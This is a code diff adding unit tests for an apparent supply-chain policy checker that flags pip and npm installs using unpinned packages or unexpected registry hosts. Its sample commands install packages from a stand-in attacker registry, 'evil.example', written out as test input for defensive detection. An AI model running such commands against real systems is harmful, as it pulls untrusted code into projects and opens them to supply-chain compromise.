@@ -488,6 +488,30 @@ def test_versioned_python_pip_install_is_classified() -> None:
 
 
 @pytest.mark.unit
+def test_versioned_pip_executables_are_classified() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "pip3.12 install requests --index-url https://evil.example/simple\n"
+            "$ /opt/python/bin/pip3.13 install httpx==0.28.1 "
+            "--extra-index-url https://mirror.example/simple\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["manager"] == "pip"
+    assert findings[0].details["unpinned_specs"] == ["requests"]
+    assert findings[1].details["registry_hosts"] == ["evil.example"]
+    assert findings[2].details["registry_hosts"] == ["mirror.example"]
+
+
+@pytest.mark.unit
 def test_pip_global_options_before_install_are_classified() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
@@ -699,6 +723,27 @@ def test_node_inline_env_registry_urls_report_unexpected_hosts() -> None:
     assert findings[0].details["registry_hosts"] == ["evil.example"]
     assert findings[1].details["registry_hosts"] == ["mirror.example"]
     assert findings[2].details["registry_hosts"] == ["bun.example"]
+
+
+@pytest.mark.unit
+def test_npm_ci_registry_overrides_report_unexpected_hosts() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ npm ci --registry https://evil.example/npm\n"
+            "$ NPM_CONFIG_REGISTRY=https://mirror.example npm ci\n"
+            "$ npm ci --registry https://registry.npmjs.org\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+    assert findings[1].details["registry_hosts"] == ["mirror.example"]
 
 
 @pytest.mark.unit
